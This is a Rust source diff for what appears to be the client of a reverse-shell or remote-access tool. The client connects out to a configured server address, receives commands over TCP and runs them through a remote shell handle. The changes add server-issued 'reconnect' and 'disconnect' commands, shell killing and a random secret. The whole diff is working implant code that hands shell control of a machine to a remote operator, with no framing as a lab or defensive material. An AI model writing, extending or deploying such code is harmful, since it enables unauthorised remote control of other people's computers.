@@ -13,6 +13,8 @@ pub mod settings;
 
 use handler::handle_command;
 use common::buffers::read_buffer;
+use rand::{rngs::OsRng, Rng};
+use std::process;
 
 
 fn handle_server(mut read_stream: TcpStream, mut write_stream: TcpStream, is_connected: Arc<Mutex<bool>>) {
@@ -20,13 +22,28 @@ fn handle_server(mut read_stream: TcpStream, mut write_stream: TcpStream, is_con
 
     let mut current_path = PathBuf::new();
 
+    let mut secret = [0u8; common::SECRET_LEN];
+    OsRng.fill(&mut secret);
+
     loop {
         let received = read_buffer(&mut read_stream);
         match received {
             Ok(bytes) => {
-                let command_str = String::from_utf8_lossy(&bytes);
+                let command_str: std::borrow::Cow<'_, str> = String::from_utf8_lossy(&bytes);
                 let commands = command_str.trim().split('\n').collect::<Vec<_>>();
                 for command in commands {
+                    if command == "reconnect" {
+                        *is_connected.lock().unwrap() = false;
+                        break;
+                    }
+
+                    if command == "disconnect" {
+                        if let Some(shell) = remote_shell.as_mut() {
+                            let _ = shell.kill();
+                        }
+                        process::exit(1);
+                    }
+
                     handle_command(&mut write_stream, command, &mut remote_shell, &mut current_path);
                 }
             }
@@ -35,10 +52,7 @@ fn handle_server(mut read_stream: TcpStream, mut write_stream: TcpStream, is_con
                 if let Some(shell) = remote_shell.as_mut() {
                     let _ = shell.kill();
                 }
-                {
-                    let mut is_connected_guard = is_connected.lock().unwrap();
-                    *is_connected_guard = false;
-                }
+                *is_connected.lock().unwrap() = false;
                 break;  
             }
         }
@@ -61,10 +75,7 @@ fn main() {
             println!("Connecting to server...");
             let stream = TcpStream::connect(format!("{}:{}", settings::IP, settings::PORT));
             if let Ok(str) = stream {
-                {
-                    let mut is_connected_guard = is_connected_clone.lock().unwrap();
-                    *is_connected_guard = true;
-                }
+                *is_connected_clone.lock().unwrap() = true;
                 handle_server(str.try_clone().unwrap(), str.try_clone().unwrap(), is_connected_clone);
             };
         });
